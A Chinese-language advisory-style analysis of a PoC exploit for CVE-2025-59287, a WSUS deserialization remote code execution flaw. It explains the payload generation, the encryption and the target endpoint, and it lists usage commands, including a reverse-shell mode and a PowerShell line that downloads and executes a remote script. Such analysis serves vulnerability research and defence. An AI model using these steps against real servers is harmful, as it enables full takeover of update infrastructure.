## CVE-2025-59287 - Microsoft Windows Server Update Services (WSUS) 远程代码执行 (RCE) / 不安全反序列化

**漏洞编号:** CVE-2025-59287

**漏洞类型:** 远程代码执行 (RCE) / 不安全反序列化

**影响应用:** Microsoft Windows Server Update Services (WSUS)

**危害等级:** 高危

**CVSS评分:** 9.8

**影响版本:** Windows Server 2025, Windows Server 2022, Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012

**利用条件:** 未经身份验证的远程访问，通过HTTP(S)协议向WSUS服务发送特制请求

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

POC有效性分析 (600-1000字):
CVE-2025-59287 是Microsoft Windows Server Update Services (WSUS) 中一个严重的不安全反序列化远程代码执行 (RCE) 漏洞。WSUS是微软为Windows服务器和客户端分发更新的核心管理工具。此漏洞的根本原因在于WSUS在处理HTTP请求中的`AuthorizationCookie`时，使用.NET的`BinaryFormatter`进行不安全的反序列化操作。未经身份验证的远程攻击者可以发送特制的`AuthorizationCookie`，其中包含恶意序列化数据，从而在WSUS服务器上以SYSTEM权限执行任意代码。

提供的Python POC脚本 `CVE-2025-59287.py` 针对这一漏洞进行了完整利用。脚本设计精巧，自动化程度高，使其成为一个高效且用户友好的攻击工具。

首先，脚本通过一个友好的横幅（banner）开始，并提供了日志功能（log_info, log_success, log_error, log_warning）以增强用户体验和调试能力。

其核心功能围绕着ysoserial.net的使用。`ysoserial.net` 是一个广为人知的 .NET 反序列化 payload 生成工具，能够利用各种 .NET 库中的 Gadget Chain 来实现 RCE。POC脚本在执行前会检查本地是否存在 `ysoserial.net/Release/ysoserial.exe`。如果不存在，它会自动从 `https://github.com/pwntester/ysoserial.net/releases/...` 下载并解压到 `Release/` 目录下，极大地简化了环境配置。

`generate_payload(command)` 函数是生成恶意反序列化数据的关键。它通过 `subprocess.run()` 调用 `ysoserial.exe`，使用 `TypeConfuseDelegate` Gadget Chain 和 Base64 编码的命令来生成payload。`TypeConfuseDelegate` 是一种常用的 .NET 反序列化攻击技术，能够利用委托对象的特性实现代码执行。

生成原始反序列化数据后，`encrypt_payload(payload_bytes)` 函数对其进行加密。WSUS在处理`AuthorizationCookie`时，会对其进行AES解密，因此POC必须模拟这一加密过程。脚本中硬编码了 `WSUS_AES_KEY` 和 `WSUS_IV`，并使用 `PyCryptodome` 库进行AES/CBC模式加密，并进行PKCS7填充。加密后的数据再进行Base64编码，以适应HTTP头部的传输要求。

最后，`send_exploit(target_url, encrypted_payload)` 函数负责将构造好的恶意请求发送给目标WSUS服务器。它通过 `requests` 库发送一个POST请求到WSUS的 `/ApiRemoting30/Service.asmx` 端点。恶意加密payload被放置在 `AuthorizationCookie` HTTP头部中。当WSUS服务器收到此请求并尝试解密和反序列化 `AuthorizationCookie` 时，就会触发漏洞并执行攻击者指定的命令。

POC脚本支持两种攻击模式：
1.  **任意命令执行**：通过 `-c <command>` 参数，攻击者可以直接在目标服务器上执行任意系统命令。
2.  **反弹Shell**：通过 `-l <lhost>` 和 `-p <lport>` 参数，脚本会构造一个PowerShell反弹Shell命令，并在本地启动一个TCP监听器等待连接。PowerShell命令通常会下载并执行一个远程脚本（例如 `IEX (New-Object System.Net.WebClient).DownloadString('http://lhost:lport/shell.ps1')`），实现持久化的交互式Shell。

综上所述，该POC脚本从漏洞原理出发，实现了从payload生成、加密到请求发送的完整攻击链，自动化程度高，功能强大，是针对CVE-2025-59287的一个高度有效且功能完整的利用工具。

利用步骤:
1.  **准备环境**: 确保攻击机器上安装了Python 3环境，并通过 pip 安装必要的库：`pip install pycryptodome requests urllib3`。
2.  **获取POC**: 将 `CVE-2025-59287.py` 脚本保存到本地。
3.  **指定目标**: 运行脚本时，需要提供目标WSUS服务器的URL，例如 `https://<target_wsus_ip_or_hostname>:<port>`。
4.  **执行任意命令**: 
    *   使用命令 `python3 CVE-2025-59287.py -t https://<target_wsus_ip>:<port> -c "whoami"` 来执行 `whoami` 命令，但请注意，此模式下通常无法直接看到命令输出。
    *   为了获取输出，可以尝试将命令输出重定向到目标服务器上的可访问文件，例如 `cmd /c "whoami > C:\Users\Public\output.txt"`。
5.  **建立反弹Shell**: 
    *   在攻击机器上，选择一个监听IP (`LHOST`) 和端口 (`LPORT`)。
    *   运行命令 `python3 CVE-2025-59287.py -t https://<target_wsus_ip>:<port> -l <your_ip> -p <your_port>`。
    *   POC脚本会自动在 `<your_ip>:<your_port>` 上启动一个TCP监听器。
    *   成功利用后，目标WSUS服务器会执行反弹Shell的PowerShell命令，连接回攻击者的监听器，从而建立一个交互式Shell。
    *   攻击者可以通过此Shell完全控制受感染的WSUS服务器。

投毒风险分析 (400-600字):
对 `CVE-2025-59287.py` POC代码进行投毒风险评估，结果显示其投毒风险极低。该POC代码的目的是为了合法地演示和利用CVE-2025-59287漏洞，其设计和实现都符合标准的安全研究实践。

首先，**外部依赖方面**，POC的核心在于自动下载并使用 `ysoserial.net` 工具。`ysoserial.net` 是一个在安全社区中广为人知且被广泛使用的 .NET 反序列化payload生成工具，由 `pwntester` 维护，其GitHub仓库公开透明。POC脚本中明确指出了 `ysoserial.net` 的下载URL (`https://github.com/pwntester/ysoserial.net/releases/...`)，并且在文件名中包含了特定的版本哈希 (`ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip`)。这种明确的、指向官方发布源的下载方式，以及版本哈希的存在，大大降低了通过恶意替换 `ysoserial.net` 进行投毒的风险。攻击者如果想要投毒，需要控制 `pwntester` 的GitHub仓库或者实施复杂的中间人攻击，这超出了POC代码本身的投毒范围。

其次，**代码逻辑与行为方面**，POC代码结构清晰，没有使用任何形式的代码混淆。所有的功能模块，包括banner显示、日志记录、文件下载、zip解压、payload生成、加密和HTTP请求发送，都通过直接且易于理解的Python代码实现。脚本中没有发现任何隐藏的、非预期的网络连接、文件写入、数据窃取或其他恶意行为。它仅执行与漏洞利用直接相关的操作。例如，它不会在未经用户明确指定的情况下连接到未知的外部C2服务器，也不会植入额外的后门程序。

最后，**反弹Shell功能**是漏洞利用的结果，而非POC代码本身的投毒。POC生成反弹Shell命令并监听用户指定的IP和端口。这个过程中，脚本本身没有硬编码任何恶意C2服务器地址。攻击者必须主动提供 `LHOST` 和 `LPORT` 参数，这意味着反弹Shell的连接目标完全由运行POC的用户控制。如果用户将反弹Shell连接到恶意服务器，那是用户行为导致的风险，而非POC脚本的内在恶意。

综上所述，该 `CVE-2025-59287.py` POC代码是一个干净、高效且目的明确的漏洞利用工具。其投毒风险评估为极低，主要风险在于 `ysoserial.net` 官方发布源的安全性，以及用户在使用时是否将反弹Shell指向了安全的监听环境。在合法防御性安全研究和测试中使用时，只要确保依赖源的真实性并控制好Shell的连接目标，该POC是可靠的。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-59287
